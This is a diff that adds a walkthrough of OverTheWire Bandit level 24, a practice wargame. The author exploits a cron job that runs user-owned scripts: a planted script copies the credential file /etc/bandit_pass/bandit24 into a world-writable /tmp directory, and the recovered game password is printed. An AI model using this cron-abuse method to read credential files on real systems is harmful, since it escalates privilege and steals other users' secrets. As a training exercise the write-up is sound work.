@@ -787,3 +787,57 @@ connect to bandit23 using given password
 
 
 - Level 24
+
+Awesome level, had to write my own bash script and exploit cron to get the password
+from the default /etc/bandit_pass/ directory, Made sure permissions are right so that
+users can actually execute the folder and other users can access the /tmp/ directory 
+which i was working in
+
+Output:
+
+bandit23@bandit:~$ mkdir /tmp/heckerman
+bandit23@bandit:~$ cd /tmp/heckerman
+bandit23@bandit:/tmp/heckerman$ chmod 777 /tmp/heckerman
+bandit23@bandit:/tmp/heckerman$ cat /usr/bin/cronjob_bandit24.sh
+#!/bin/bash
+shopt -s nullglob
+myname=$(whoami)
+
+cd /var/spool/"$myname"/foo || exit
+echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
+for i in * .*;
+do
+    if [ "$i" != "." ] && [ "$i" != ".." ];
+    then
+        echo "Handling $i"
+        owner="$(stat --format "%U" "./$i")"
+        if [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then
+            timeout -s 9 60 "./$i"
+        fi
+        rm -rf "./$i"
+    fi
+done
+bandit23@bandit:/tmp/heckerman$ nano script.sh
+Unable to create directory /home/bandit23/.local/share/nano/: No such file or directory
+Unable to create directory /home/bandit23/.local/share/nano/: No such file or directory
+It is required for saving/loading search history or cursor positions.
+
+bandit23@bandit:/tmp/heckerman$ dir
+script.sh
+bandit23@bandit:/tmp/heckerman$ cat script.sh
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/heckerman/password.txt
+bandit23@bandit:/tmp/heckerman$ chmod +x script.sh
+bandit23@bandit:/tmp/heckerman$ cp script.sh /var/spool/bandit24/foo/script.sh
+bandit23@bandit:/tmp/heckerman$ dir
+script.sh
+bandit23@bandit:/tmp/heckerman$ dir
+password.txt  script.sh
+bandit23@bandit:/tmp/heckerman$ cat password.txt
+gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
+____________
+
+connect to bandit24 using given password
+
+
+- Level 25
